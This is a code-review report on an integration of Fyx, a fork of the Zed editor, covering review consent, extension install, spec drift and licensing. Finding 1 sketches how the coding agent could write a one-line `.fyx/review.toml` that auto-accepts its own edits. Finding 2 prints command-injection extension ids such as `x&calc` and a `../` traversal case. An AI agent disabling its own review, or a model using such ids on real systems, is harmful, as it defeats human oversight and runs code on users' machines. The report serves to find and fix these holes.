# Judge review: integration-4

**Scope.** Everything merged on `origin/integration` since integration-3 (`377d5ca39f`), up to
`1ec364bfc0`. The diff is 119 files, +9031/−755. Merged since integration-3:
- W1's product-name sweep (`8754c5b108`);
- W3: installed-folder scan, install action, capability chips, keyboard handling, diff-view;
- W5 steps 2–4: the review setting, `.fyx/review.toml` rules, the dev-only script driver;
- W6 decorations;
- W8c;
- ci-readme;
- the 0.2 design.

**Not merged yet.** The 12-branch batch had **not** fully landed when this was written. Six
branches were still ahead of `integration`. They were reviewed at their heads, and findings that
apply only to them are marked **(branch)**:

| Branch | Head reviewed | Moved since |
|---|---|---|
| `claude/fyx-w3-renderer-e20d2b` | `be531759a0`: `ui_ext_wasm` move, store limits | now `171ae8e5f0` |
| `claude/fyx-w1-rebrand-904c67` | `5fe80bdb1b`, `06c4103d1e`: Fyx glue moved to `crates/zed/src/zed/fyx.rs` | now `6102f9d482` |
| `claude/fyx-w4-sdk-demos-5d1497` | `5f0ef15591`, `fcb1ca52a7`: 0.2 decisions in the design, icons | |
| `claude/fyx-ts-sdk` | `af96c0f873` | |
| `claude/fyx-ext-template` | `559014f693` | |
| `claude/fyx-platform-spec` | `d578d8ef33` | |
| W5 | local, unpushed `4182326743` (5 commits) | |

**Method.** Nothing was built or run. Three separate reviewers read W5, W3, and the spec, TS SDK,
template and W8c. W7 read W1, CI, the README and the upstream surface, and re-checked findings 1
and 2 against the code.

## Verdict

The architecture rules still hold:
- no WASM calls from `render()`;
- theme tokens only;
- one call per input event;
- a clean WASI context.

The CI workflows are safe: push and dispatch triggers only, `contents: read`, actions pinned by
SHA, no persisted credentials, and dispatch input passed through `env`.

Two new paths break consent and need fixing before anything else lands on top of them:
- **Finding 1:** a project's `.fyx/review.toml` can auto-accept agent edits, and the agent can
  write that file.
- **Finding 2:** an extension id from `extension.toml` reaches `cmd /C mklink` without validation.

Separately:
- **Upstream surface:** the hand-edited upstream surface went from 21 files to **67** (finding 5).
- **Spec drift:** the platform spec plans for a startup budget the host does not give, and misses
  the real TypeScript cost (finding 4).

## Top 5

1. **W5: a project's `.fyx/review.toml` turns review off for its own agent** (finding 1).
2. **W3: Windows command injection and path traversal through the extension id on install**
   (finding 2).
3. **W3: installed UI extensions load without consent.** The capability chips inform; they do
   not ask (finding 3).
4. **Spec and TS SDK: the TypeScript startup cost is planned wrongly.** It is 4.7 s of compile on
   every launch, outside every budget, and it evicts other extensions' cache entries (finding 4).
5. **W1: the product-name sweep tripled the upstream surface,** to 67 files, much of it in
   high-churn crates (finding 5).

## Status of earlier findings

### triage-2 top 5

| # | Item | Status |
|---|---|---|
| 1 | Review misses ACP v2 writes, the native agent and terminal writes (W5D H1–H3) | **H1:** open on integration (`agent_review.rs:855-871` handles legacy permission requests only); mostly fixed **(branch)**: single-file `DiffPatch` preview plus a notice when a v2 edit cannot be previewed. **H2:** open; still needs the user's decision. **H3:** partly fixed: writes are reported, not blocked. A file already reviewed in the turn is left out of the "unreviewed" list, so a later `sed -i` on it is still silent (`agent_review.rs:361-377`). |
| 2 | Script driver in release builds (i3 #1, W5D M5) | **Resolved.** A `cfg` gate (`agent_review.rs:13,140`); the `review-script` feature is never enabled; a `warn!` while it runs; an action allowlist **(branch)** (`script_driver.rs:35`). |
| 3 | `vsix-convert` is GPL-derived but labelled Apache-2.0 (LIC F1) | **Open.** `tools/vsix-convert/package.json` still says `Apache-2.0`. Needs the user's decision. |
| 4 | Zed's name, IDs and ToS in bundles (LIC F2, F3) | **Partly fixed.** Windows installer names, IDs and publisher are done (`script/bundle-windows.ps1`, `zed.iss`). macOS bundle metadata is fixed **(branch)** `5fe80bdb1b`. App icons are replaced **(branch)** `fcb1ca52a7`. The DMG ToS step is **open** (`script/bundle-mac:292-293`). New: see finding 6. |
| 5 | Copilot env token at startup; Anthropic `/v1/log/zed` | Not in this batch. **Open** (W1). |

### Other carried items

| Item | Status |
|---|---|
| i3 #2 (no installed-extensions path) | **Code resolved** (`registry.rs:240-298,528-552`; `install.rs`). `docs/fyx/manual-tests.md:13-18` and the template README still say "dev env var only": **W7 updates these** (and see finding 9). |
| i3 #8 (`list-rows` loop after a resync) | **Resolved.** The generation counter never resets (`surface.rs:549-551`), and stale generations are dropped (`:654-660`). |
| i3 #9 (stale row click, remount counter, Retry on a dead instance, cross-view typing flush) | **Resolved:** `surface.rs:290,338-357,362-366,248-255`; `view.rs:457-466,119-145`. The remount-counter fix overshoots (finding 11). |
| i3 #10 (input lost on remount; two row calls) | **Partly fixed.** Row calls are merged into one (`surface.rs:562-588`). The input carry-over is too broad (finding 8). |
| W5D M2 (failed host write saves a dirty buffer) | Partly fixed; resolved **(branch)** (`:1422-1440`). |
| W5D M3 (held writes outlive the turn) | Resolved **(branch)**. `Stopped`, `Error` and `ConnectionLost` close reviews, and the last pane closing closes them too. |
| W5D M1, M4, M7, L1, L3–L9 | Open. |
| LIC F4 (README) | **Resolved.** The Fyx README has a "Not affiliated with Zed Industries" section and the license split. |
| LIC F5 (`LICENSE-APACHE` names only Zed) | Open: still `Copyright 2022 - 2025 Zed Industries, Inc.` only. |
| DIFF #1 (move the `fyx_ui` runtime out of `extension_host`) | Resolved **(branch)** `b535d9ed98`. New crate `crates/ui_ext_wasm`, which does not depend on `extension_host`. Both hook lines are gone, and `git grep fyx crates/extension_host` is empty. |
| DIFF #2 / i3 #4 (Fyx glue out of upstream files) | Resolved **(branch)** `5fe80bdb1b`. Moved to `crates/zed/src/zed/fyx.rs`; `main.rs` loses 26 lines. That module still panics on a bad overlay (`fyx.rs`, `layer_default_settings`), as triage-2 noted. |
| i1 #13 / DIFF #7 (`Cargo.toml` markers) | **Partly fixed.** Members now carry `# fyx` (`c0dade7a41`), but without the colon, so `git grep -n 'fyx: '` still misses them. |

## Findings, most severe first

### 1. High: a project's `.fyx/review.toml` turns review off for its own agent (W5)

**Where.**
- `auto_accept` patterns from the worktree's rules file let edits land without review
  (`review_rules.rs:122,146-149`; applied at `agent_review.rs:700-713`).
- The only guard is worktree trust:
  - it **fails open** when there is no `TrustedWorktrees` global (`agent_review.rs:942-947`,
    `None => true`);
  - any `trust_all_worktrees` setting counts as trust;
  - Zed's trust is consent to run language servers and tasks, not consent to unreviewed agent
    edits.
- On integration, every change to the file is applied immediately (`agent_review.rs:809-814`).
- **(branch)** A changed file goes pending until the user confirms, but `RulesLoad::ThreadStarted`
  calls `set_rules` from disk and clears the pending change (`4182326743`, `agent_review.rs:139,
  1337-1339,510`). Every new `AcpThread` starts that path, including a subagent thread the agent
  opens itself.
- A read error loads as "no rules" (`:970`), so `deny` rules disappear silently.

**Scenario.**
1. Review mode is on, in a trusted project.
2. The agent runs `printf 'auto_accept = ["**"]\n' > .fyx/review.toml` in its terminal (finding
   H3 means nobody is told).
3. Every later edit in the session lands unreviewed.

This breaks requirement M6.1 ("only user-level settings can loosen review") and M6.3 ("rules
written by the reviewed session are never applied"). `docs/fyx/review-rules.md:5` claims neither
the agent nor an extension can change the policy.

**Fix (W5).**
- Make project rules tighten only: drop `auto_accept` from `.fyx/review.toml`, or honour it only
  when the same pattern also appears in **user** settings.
- Fail closed when trust is unknown.
- Apply any rules change only after the user confirms it in a dialog that shows the diff. That
  includes the thread-start path.
- A read error must keep the previous rules.
- Match rules against the resolved buffer path (`buffer.file()`), not the path the agent sent
  (`review_rules.rs:140`). Otherwise case differences and `..` segments may slip past `deny` on
  Windows and macOS. That case is unverified.

### 2. High: Windows command injection and path traversal through the extension id on install (W3)

**Where.**
- `install_dev_ui_extension` joins the unchecked `id` from `extension.toml` onto the installed
  folder (`ui_ext_host/src/install.rs:67-68`). `UiManifest::read` checks the version and the
  component path but never the id (`fyx_ui.rs:171-196`).
- It then calls `fs.create_symlink`, which on Windows runs `cmd /C mklink /J <path> <target>`
  (`crates/fs/src/fs.rs:747-754`).
- Rust quotes an argument only when it contains spaces, tabs or quotes, so `cmd` interprets `&`,
  `|` and `^` in the id.

**Scenario.** A downloaded extension folder with `id = "x&calc"` or
`id = "x&\\\\host\\s\\p.exe"` runs a program when the user clicks Install. The install prompt
shows the id, but nobody reads it as a command. On every OS, an id with `../` places the link
outside the installed folder, and `remove_file` first deletes any existing symlink at that target
(`install.rs:69-82`).

Still present **(branch)** `be531759a0`.

**Fix (W3, with W2c for the shared rule).**
- Validate the id in `UiManifest::read`: `[a-z0-9][a-z0-9_-]{0,63}`, the same rule the 0.2 design
  uses for surface ids.
- In `install.rs`, assert `target.parent() == installed_dir`.
- Longer term, create junctions without `cmd`: the `junction` crate, or `std::os::windows` APIs.
  This also protects Zed's own callers of `create_symlink`.

### 3. Medium: installed UI extensions load without consent (W3)

**Where.**
- Every folder in `ExtensionStore::installed_dir` that has a `[fyx_ui]` table is instantiated at
  startup, with no prompt (`registry.rs:436-486,528-547`). That includes folders put there by
  Zed's "Install Dev Extension", by the (dead) registry, or by hand.
- A linked dev folder stays live. An `extension.toml` edited after the user consented, for example
  to add `ui:status-bar`, is accepted on the next load (`registry.rs:256`).
- The capability chips (`registry.rs:131-153`, `extension_card.rs:613,664-665`) are computed from
  surfaces that are already loaded. They describe what already happened.

**Fix (W3).**
- Record consent as (id, capabilities, component SHA-256) in Fyx's data directory.
- Load an extension only when its current manifest and component match a consent record.
  Otherwise show the capabilities and ask before `load_from_dir`.

Platform spec decision 6 and decision 13 have to say the same (finding 9).

### 4. Medium (High for the TS track): the TypeScript startup cost is planned wrongly (spec / W4, W2c)

**Where.**
- `docs/fyx/platform/spec.md:115-117` (decision 25) and `:184-185` (failure 6) say "the first
  `mount` … gets 2 s".
- The host gives 2 s only to instantiation plus `surfaces()` (`fyx_ui.rs:446-490`, now in
  `ui_ext_wasm` **(branch)**). `mount` gets the normal 200 ms (`fyx_ui.rs:579-590,721-724`).

**Measured by the prototype** (`sdks/ts/README.md:148-149,187-195`):
- `mount` takes 0.5 ms;
- the real cost is **4.7 s of Cranelift compile on every launch**, outside every budget;
- it produces 35.7 MiB of incremental-cache entries;
- the cache is in memory, capped at 32 MiB, and shared with Zed's own extensions
  (`wasm_host.rs:1019`). Each TS extension therefore evicts every other extension's compiled code.

No plan item persists compiled components, precompiles at install time, or shares one JS engine.

**Fix.**
- Correct decision 25 and failure 6.
- Add to the plan:
  - precompile at install, storing the `Engine::precompile_component` output keyed by component
    hash, engine config and wasmtime version;
  - a separate cache for UI components;
  - a statement on whether several TS extensions can share one engine.
- Until then, document "about 5 s per TS extension per launch".

### 5. Medium: the product-name sweep tripled the upstream surface (W1; the user decides)

`git diff v1.28.1 origin/integration` with the canonical exclusions (Fyx crates, Fyx files in
upstream crates, docs, tasks, tools, sidecars, `sdks/`, `*.md`, `Cargo.lock`, `fyx.json`,
`script/fyx-*`, `script/gate.sh`, `fyx_*` workflows):

| Measure | integration-3 | integration-4 |
|---|---|---|
| Files | 21 | **67** |
| Lines | +150/−46 | **+341/−215** |

Since integration-3: 51 files, +202/−180. About 40 of those files are one- or two-line string
swaps from `8754c5b108`. Many sit in the crates upstream changes most:
- `language_models/src/provider/*` (9 files);
- `settings_ui` (6 files);
- `agent_ui`, `onboarding`, `copilot_ui`, `context_server`.

Two upstream files took larger edits: `crates/cli/src/main.rs` (+26/−25) and
`script/bundle-windows.ps1` (+40/−39). Each string is marked, but each is a rebase conflict point.
DIFF #3 recommended one product constant (an upstream PR), and triage-2 said to sweep "titles,
dialogs, notifications first".

**Decision for the user:**
- (a) keep the sweep and accept more rebase work per release; or
- (b) revert the strings in settings help text and provider setup pages, keeping titles, menus,
  dialogs, notifications, the CLI and the installer.

Option (b) roughly halves the file count. In both cases, open the upstream "fork-friendly
product name" PR (DIFF #3), which would remove most of these edits.

### 6. Medium: the Windows installer still registers Zed's Explorer shell extension (W1, packaging)

**Where.**
- `script/bundle-windows.ps1` still copies `zed_explorer_command_injector.{dll,appx}`.
- `zed.iss:1370` registers it with `Add-AppxPackage`. Its manifest uses Zed's identity:
  `Name="ZedIndustries.Zed"`, Zed Industries as publisher, and `Clsid="6a1f6b13-…"`, the same
  CLSID Zed stable uses (`crates/explorer_command_injector/AppxManifest.xml:17-23,59-62`;
  `explorer_command_injector.rs:130-133`).
- The DLL launches `Zed.exe` from its own folder (`explorer_command_injector.rs:176-177`). The
  Fyx folder now contains `Fyx.exe`.

**Failure.**
- Installing Fyx next to Zed replaces Zed's context-menu package registration, or fails on it.
- Fyx's own "Open with Zed" entry starts nothing.

This breaks "coexists with Zed".

**Fix.** Until the injector is rebranded (its own GUIDs, identity, exe name and label), drop the
DLL and appx from the Fyx installer.

### 7. Medium: W3 store limits do not bound host memory (W3, branch)

`ui_ext_wasm.rs:126,340-357,438` **(branch)** `be531759a0`:
- There is no byte cap on strings. Each push may copy up to 32 MiB out of the guest, and 64 pushes
  per call are held, so about 2 GiB can arrive in one call.
- `TreeLimits` counts nodes, not bytes, so the retained tree grows across calls.
- The WASI `ResourceTable` has no cap.
- The memory limit is per memory, and 8 memories are allowed.

**Fix.**
- A byte budget per call, counting the summed sizes of pushes and the reply.
- A byte cap on the retained tree, for example 32 MiB per surface.
- A `ResourceTable` limit.
- 1 memory.

### 8. Medium: the remount input carry-over also fires on the extension's own rebuilds (W3)

`view.rs:237-269` copies typed text into a renumbered input after any `replace` or `rebuild`, not
only after a resync the host started.

**Scenario.**
1. The user submits "hello".
2. The extension clears the form by rebuilding it with a new, empty input.
3. Fyx writes "hello" back into the new input and sends a synthetic `input-changed`.

**Fix:** carry the text only while `resyncing`.

### 9. Medium: the platform spec and the TS SDK, template and demos drift from what is built and from the 0.2 plan (spec / W4)

- **Install design.**
  - Spec decision 6 (`fyx.extensions.dev_paths` setting) and decision 13
    (`<data_dir>/extensions/fyx/<id>/<version>/`) contradict what is built: links in
    `ExtensionStore::installed_dir/<id>` plus a scan with hot reload (`install.rs:1-7`,
    `registry.rs:7-17,62`).
  - Plan 1.2/1.3 schedule both as new work, with no migration.
  - **Fix:** rewrite decisions 6 and 13 around the built layout, plus the consent record from
    finding 3.
- **0.2 migration.**
  - `docs/fyx/wit-0.2/migration.md` §1 (`:26-32`) does not list `sdks/ts/scripts/build-component.mjs:26-27`
    or the `gen-types` script among the WIT path users.
  - In 0.2, `register_extension!(T)` defaults to the 0.2 world. The template
    (`script/fyx-new-extension:136,192,205,227`) and the three new demos still write
    `api_version = "0.1.0"`, so their output would stop loading.
  - Three demo icons are not in the frozen 101: `git_merge_conflict`, `file_markdown`,
    `user_check`.
- **The 0.2 world is marked ready but is incomplete.** `design.md:3` says "ready for
  implementation", but §M (notifications and progress, `:37`) is not in the WIT yet.
- **Out-of-date instructions.** The template README (`fyx-new-extension:288-295`) and the new
  `extension-authoring.md` quick start still say extensions load only from `FYX_UI_DEV_EXTENSIONS`,
  after a restart. Hot reload and the install command now exist.
- **`claude/fyx-ext-template` (branch):**
  - it edits `Cargo.toml` and `Cargo.lock`, which only the integrator may change;
  - it and `claude/fyx-ts-sdk` both add the "Remove this line to confirm you've reviewed this PR"
    banner to `README.md:1-2`. Both branch from `f3718cae58` (Zed's README), so they will conflict
    with integration's Fyx README. W0 drops the banner at merge (see integration-3 finding 7, the
    `.rules` decision).
- **TS build on Windows.** `build-component.mjs:28,88` runs `node_modules/.bin/jco` through
  `spawnSync` without a shell, which does not run on Windows. The `build` script also uses `cp`.

### 10. Low: other items

- **W5 (branch) regression.** `submit` now holds the permission responder until
  `finish_permission` (`81062f7582`, `agent_review.rs:620-637`). Answering the permission emits
  `ToolAuthorizationReceived`, and `permission_answered` (`:803-815`) then closes that review
  before `record` runs. Effects:
  - Allow decisions are not adopted, so the same edit is reviewed twice.
  - Files the user just reviewed are reported as "changed without review".

  **Fix:** skip reviews whose `applying` is set.
- **W5 (branch).** When the buffer is dirty, the host writes accepted hunks without saving, but
  the agent gets `RejectOnce` and reads the old file from disk.
- **W5.** `reload_rules` calls `can_trust` for every worktree at each thread start
  (`agent_review.rs:942-945`). That can raise trust prompts in projects with no rules file.
- **W5.** `docs/fyx/review-rules.md:45` says "each worktree's own file covers its files". In fact
  a nested worktree without a file falls under the outer worktree's rules (`review_rules.rs:417-423`).
- **W1.** Onboarding still offers "Help improve Fyx by sending anonymous usage data" and crash
  reports (`onboarding/src/basics_page.rs:244-271`), though Fyx has no endpoint and its defaults
  turn both off. Either hide the section in `fyx::init`, as the zed.dev cards are skipped, or say
  where the data would go.
- **W1 (branch).** `fyx.rs` skips Zed's onboarding by writing the literal key
  `"dismissed-trial-upsell"`, which is a private constant in `agent_ui/src/agent_panel.rs:6718`.
  An upstream rename silently brings back the zed.dev card. Add a test that reads the constant
  through a `fyx:` re-export.
- **W1 (branch).** The default agent model in `fyx.json` is `anthropic` / `claude-sonnet-5-5`.
  That is a valid id (`anthropic.rs:53`). Choosing a vendor default is a product decision: flag it
  to the user.
- **W3 (branch).** `ui_ext_wasm` links the WASI sockets interfaces (`add_to_linker_async`,
  `:468`). Denial depends on wasmtime-wasi's defaults, which were not checked. Add the probe test
  from triage-2 (W9).
- **W3.** A `diff-view` inside list rows recomputes the diff and allocates labels on every frame,
  without Zed's machinery (`view.rs:976-1005`). Its doc comment at `:953-956` is stale.
- **W3.** The remount counter is reset by any row answer whose pushes apply, even an empty list
  (`surface.rs:635-637`). Two surfaces that push bad updates at each other from `list-rows` remount
  forever.
- **W3.** Two installed folders with the same id share one fingerprint slot
  (`registry.rs:265,390`), so the extension reloads on every scan.
- **W8c.** The new `--permission` check rejects only literal `*` grants (`host.ts` `WIDE_GRANTS`,
  around lines 53-81). `--allow-fs-read=/`, `C:\` or `~` pass. Node documents that its permission
  model is no defence against malicious code, but `vscode-coverage.md` calls it a sandbox for
  third-party extensions. Reword that, and reject root and home grants.
- **0.2 docs on integration.** `tasks/wit-0.2.md` still shows the superseded shapes. The decided
  design exists only on the W4 branch, mixed with app-icon commits. **W0:** merge the design part
  on its own.
- **Template.** `--sdk-git`, `--sdk-rev` and `--sdk-branch` values go into TOML unescaped
  (`fyx-new-extension:83-89`). Names have no length limit, so a name over 64 characters gives a
  surface id that 0.2 rejects.
- **TS SDK.** jco 1.42 pulls `componentize-qjs` native binaries from a personal npm scope
  (`@andreiltd/*`). Pin it, or vendor it with a checksum. `@types/node` is the only unpinned
  dependency.

### 11. Checked and correct

- **CI.** `.github/workflows/fyx_gate.yml` and `fyx_rebase_check.yml`:
  - triggers are push to `integration`/`fyx/main`, plus schedule and dispatch; no
    `pull_request_target`;
  - `permissions: contents: read`, plus `issues: write` for the rebase check only;
  - every action is pinned by SHA, with `persist-credentials: false`;
  - the dispatch `tag` input reaches the script through `env`, so there is no expression
    injection;
  - the rebase check never pushes.
- **W3.** No WASM calls from render; theme tokens only; one call per input event, with Enter and
  Space each consumed once (`keyboard.rs:46-73`); the surface diff view uses `acp_thread::Diff`
  with a read-only `Editor` and rebuilds only when its props change (`view.rs:275-284,1069-1125`).
  Upstream hooks on integration are 3 lines in `extensions_ui`, all marked.
- **W5.** Toggling the setting never releases held writes (`set_enabled`, `:282`). VS Code
  import cannot map onto the review key (`vscode_import.rs:186`). `.zed/settings.json` cannot turn
  review off, because project settings parse as `ProjectSettingsContent`.
- **TS SDK.** One 6-byte `fyx:ui-api-version` section, three big-endian u16s, with a duplicate
  refused. The jco-generated types match the WIT exactly. Row-local ids from `0x8000_0000`, caps
  of 2048 and 16384, pushes as in the Rust SDK. `host-check` is its own Apache-2.0 workspace
  pinned to wasmtime `=48.0.7`. No install scripts, and every package has an integrity hash.
- **Template.** The name regex blocks path traversal and quoting. The generated `[fyx_ui]` keys
  pass `deny_unknown_fields`. The three demos declare only `ui:panel`, use only tokens, and test
  their trees against `ui_ext::Tree`.
- **W8c.** The JSON schema matches `types.rs`, and the mock host refuses updates atomically.
- **README.** The license split and the non-affiliation notice are present (LIC F4 resolved).

## Upstream hooks

The hooks added since integration-3, by stream:

| Stream | Hook | Marked |
|---|---|---|
| W1 | ~40 files of `"Zed"`→`"Fyx"` strings (`8754c5b108`) | yes, per line or per block |
| W1 | `crates/cli/src/main.rs` (help text, `../Fyx.exe` lookup) | yes |
| W1 | `crates/util/src/util.rs:366` (`bin/fyx.exe`) | yes |
| W1 | `crates/zed/resources/windows/zed.iss` | yes |
| W1 | `script/bundle-windows.ps1` | yes |
| W1 **(branch)** | Glue moved into `crates/zed/src/zed/fyx.rs` | yes |
| W1 **(branch)** | `crates/cli` `URL_PREFIX` | yes |
| W1 **(branch)** | `crates/zed/Cargo.toml` bundle metadata | yes |
| W3 | `crates/extensions_ui/Cargo.toml:44-45` | yes |
| W3 | `components/extension_card.rs:613,664-665` | yes |
| W3 **(branch)** | `Cargo.toml` +2 for `ui_ext_wasm` | yes |
| W3 **(branch)** | `extension_host` hooks removed | — |
| W5 | `acp_thread.rs:8090` (`feedback_error`) | yes |
| W5 | `fyx_review.rs` (+36) | yes |
| W5 | `settings_content/src/fyx.rs` (new) | yes |
| W5 | `settings_content.rs:6,23,214-215` | yes |
| W5 | `settings_content.rs:413` (edit of an upstream list line) | **no**; marked **(branch)** |
| W5 | `settings/src/vscode_import.rs:186` | yes |
| W5 | `agent_ui/src/agent_panel.rs:5773` (review-mode menu entry) | yes |
| W0 | `Cargo.toml` members and path dependencies marked `# fyx` | without the colon |
| ci-readme | `README.md` (rewritten) | n/a |
| ci-readme | `.github/workflows/fyx_*` | new files |

The total is the integration-4 column of the table in finding 5. When the W1 and W3 branches land,
they take `main.rs`/`zed.rs`/`open_listener.rs` down to one-line hooks and remove the two
`extension_host` files. Measure again then, with one canonical pathspec. DIFF #12 proposes a
`script/fyx-diff-stat`; W0 to add it.

## Decisions for the user

1. **Project review rules (finding 1):** may a project file ever *auto-accept* agent edits?
   Recommended: no. Projects may only tighten review, and auto-accept lives in user settings only.
2. **Product-name sweep (finding 5):** keep all ~40 files, or revert settings help and provider
   text and keep only the user-facing chrome.
3. **Earlier decisions still open:**
   - native-agent review (H2);
   - the `vsix-convert` license (LIC F1);
   - the DMG Terms of Service (LIC F3);
   - the `LICENSE-APACHE` copyright holder (LIC F5);
   - the default AI vendor (Anthropic) in `fyx.json` **(branch)**.
